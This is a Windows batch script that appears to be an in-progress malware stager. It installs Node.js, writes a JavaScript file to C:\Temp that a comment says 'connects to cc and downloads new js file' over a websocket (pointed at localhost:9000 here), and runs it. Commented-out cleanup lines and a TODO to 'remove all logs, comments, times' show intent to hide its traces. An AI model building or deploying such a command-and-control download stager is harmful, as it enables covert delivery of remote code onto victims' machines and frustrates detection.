@echo off

set "TEMP_PATH=C:\Temp"
set "RAW_FILE=script"
set "READY_FILE=script.js"
set "LOGS=logs.txt"
set "npm=npm"

:: Check if node installed
where node > nul 2>&1
if %errorlevel% equ 0 (
  echo [%time%] nodejs is installed, current version: & node -v
) else (
  echo [%time%] nodejs is not installed, starting new installation...
  echo Y | choco install nodejs
  echo [%time%] done
)

:: Set PATH env vars
set "NODE_HOME=C:\Program Files\nodejs"
set "PATH=%NODE_HOME%;%NODE_HOME%\npm;%PATH%"
echo [%time%] nodejs and npm added to PATH

:: Check if C:\Temp directory exists
if not exist %TEMP_PATH% (
  mkdir %TEMP_PATH%
  echo [%time%] C:\Temp directory created
)

:: Remove old rawFile
set "file=%TEMP_PATH%\%RAW_FILE%"
if exist %file% ( 
  del %file%
  echo [%time%] old %file% deleted
)

:: Remove old completed file
if exist %TEMP_PATH%\%READY_FILE% (
  del %TEMP_PATH%\%READY_FILE%
  echo [%time%] old %TEMP_PATH%\%READY_FILE% deleted
)

set "RAW_FILE_PATH=%TEMP_PATH%\%RAW_FILE%"

:: Write js file which connects to cc and downloads new js file
cd %TEMP_PATH%
call %npm% init --y > %LOGS% 2>&1
call %npm% i ws >> %LOGS% 2>&1
echo const Websocket=require('ws'); >> %RAW_FILE_PATH%
echo const fs=require('fs'); >> %RAW_FILE_PATH% 
echo const ws=new Websocket('ws://localhost:9000'); >> %RAW_FILE_PATH%
echo ws.on('open',()=^> { >> %RAW_FILE_PATH%
echo   console.log('[%time%] connected to remote server'); >> %RAW_FILE_PATH%
echo   console.log('[%time%] starting download...'); >> %RAW_FILE_PATH%
echo   ws.send(JSON.stringify('cmd_start_download'));}); >> %RAW_FILE_PATH%
echo ws.on('error',(error)=^>{ >> %RAW_FILE_PATH%
echo   console.error('[%time%] ws err:',error.message);}); >> %RAW_FILE_PATH%
echo ws.on('close',()=^>{ >> %RAW_FILE_PATH%
echo   console.log('[%time%] connection closed');}); >> %RAW_FILE_PATH% 
echo ws.on('message',(data)=^>{ >> %RAW_FILE_PATH% 
echo    if(data==='fileEnd'){ >> %RAW_FILE_PATH% 
echo        console.log('download completed'); >> %RAW_FILE_PATH% 
echo    }else if(data==='fileError'){ >> %RAW_FILE_PATH% 
echo        console.error('error downloading'); >> %RAW_FILE_PATH% 
echo        ws.close(); >> %RAW_FILE_PATH% 
echo    }else{ >> %RAW_FILE_PATH% 
echo        fs.appendFileSync('receivedFile.txt', data);}}); >> %RAW_FILE_PATH% 

echo [%time%] file ready

cd %TEMP_PATH%
rename %RAW_FILE% %READY_FILE%
echo [%time%] executing...
node %TEMP_PATH%\%READY_FILE%
@REM timeout /t 5
@REM del %TEMP_PATH%\%READY_FILE%
@REM del %TEMP_PATH%\package.json
@REM del %TEMP_PATH%\package-lock.json
@REM del %TEMP_PATH%\_0x9999a1
@REM del %TEMP_PATH%\_0x99991a
@REM echo y | del /Q %TEMP_PATH%\node_modules

:: TODO: REMOVE ALL LOGS, COMMENTS, TIMES, ETC

:end